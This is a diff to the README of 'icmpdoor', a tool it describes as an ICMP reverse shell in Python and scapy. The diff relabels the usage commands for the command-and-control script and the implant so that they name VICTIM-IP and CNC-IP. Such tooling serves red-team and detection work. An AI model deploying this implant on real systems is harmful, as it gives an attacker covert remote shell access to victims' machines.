@@ -5,20 +5,20 @@ icmpdoor is an ICMP rev shell written in Python3 and scapy. Tested on Ubuntu 20.
 
 **Python version usage (both Windows and Linux):**
 ```bash
-./icmp-cnc.py -i INTERFACE -d DESTINATION_IP (Command and Control)
-./icmpdoor.py -i INTERFACE -d DESTINATION_IP (Implant)
+./icmp-cnc.py -i INTERFACE -d VICTIM-IP (Command and Control)
+./icmpdoor.py -i INTERFACE -d CNC-IP (Implant)
 ```
 
 **Binary Windows version usage version:**
 ```bash
-./icmp-cnc.exe -d DESTINATION_IP (Command and Control)
-./icmpdoor.exe -d DESTINATION_IP (Implant)
+./icmp-cnc.exe -d VICTIM-IP (Command and Control)
+./icmpdoor.exe -d CNC-IP (Implant)
 ```
 
 **Binary Linux version usage version:**
 ```bash
-./icmp-cnc -d DESTINATION_IP (Command and Control)
-./icmpdoor -d DESTINATION_IP (Implant)
+./icmp-cnc -d VICTIM-IP (Command and Control)
+./icmpdoor -d CNC-IP (Implant)
 ```
 
 **Parameters details:**
